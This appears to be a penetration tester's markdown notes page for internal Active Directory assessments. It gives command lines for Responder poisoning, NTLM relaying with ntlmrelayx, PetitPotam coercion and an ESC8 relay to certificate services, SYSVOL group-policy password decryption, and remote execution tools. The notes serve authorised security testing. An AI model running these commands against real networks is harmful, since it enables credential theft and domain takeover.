---
layout: blank
pagetitle: Internal Assessments
---

## Notes on tooling
- Impacket has been a bit hit or miss with pip and packages and all
- What's worked has been installing impacket via `python3 -m pipx install impacket`
  - However, tools using `impacket` as a library (like Petitpotam) will fail, since impacket isn't installed as a pip library
  - Thus, create a virtual environment just for pip
    - `python3 -m venv pipenv`, `source pipenv/bin/activate`, and `pip install impacket`
  - Tools like petitpotam will now be able to reference the impacket library within the venv



## Poisoning/Relaying/Coercing
- Poisoning is often your best friend on internals
- Run `sudo responder -I {network_interface}` to capture auth information
  - Can try to crack NTLMv2 info or relay it onwards
- If the credentials can't be cracked, pair responder up with `ntlmrelayx`
  - `impacket-ntlmrelayx -t {protocol_like_smb}://{dc_ip} `
- Can check for available coercion methods with `nxc smb {IP} -M coerce_plus -o LISTENER={kali_IP}`
  - This is better with credentials; can check for more methods (`-u {domain}\{user}` and `-p {password}`)
- Petitpotam
  - Very powerful tool; uses `EfsRpcOpenFileRaw` to convince the DC to open a file at `\\attacker_share\share`, thus causing the DC to authenticate to us
  - We can capture the credential using impacket's `smbserver` to try and crack it, but this is pretty unlikely to work due to the randomized passwords
    - `smbserver.py loot $(pwd) -smb2support` will host a share on our IP called `loot`
    - Instead, we should relay them on with impacket's `ntlmrelayx` or `certipy`
  - ESC8 relay example:
    - Run `python PetitPotam.py {kali_IP} {vulnerable_DC_IP}` to get the server to authenticate to us
      - PetitPotam won't capture the credentials on its own, thus:
    - Use `ntlmrelayx.py -t http://{target_DC_IP}/certsrv/certfnsh.asp -smb2support --adcs --template 'KerberosAuthentication'` to relay the auth to the target
      - Can also use `--template 'DomainController'`, need to look in to when to use which

## RPC
- 

## SMB Shares
- `smbclient -L //{ip}/ -N` for anonymous, or `-U 'domain/username` for credentials
  - `recurse ON` to recursively list files
  - Check inside SYSVOL policies/{guid}/machine/preferences/groups for a group policy password
    - If found, decode with `gpp-decrypt`

## Getting execution with credentials
- Try `smbexec`, `wmiexec`, `psexec`, `xfreerdp`, and `evil-winrm` depending on the ports open

## Webservers
- Run gowitness on the IP ranges, enumerate mainly the 200s unless there's time for all
- `gowitness scan cidr --write-db --cidr {IP_range} --write-db`
  - If we have a list of IPs: `gowitness scan file  --write-db -f {file_with_ips}`
  - If we have a list of CIDRs: `gowitness scan cidr  --write-db --cidr-file {file_with_cidrs}`
- Then just view the results by running `gowitness report server` in the same directory (with `gowitness.sqlite3`)

## SCCM
- 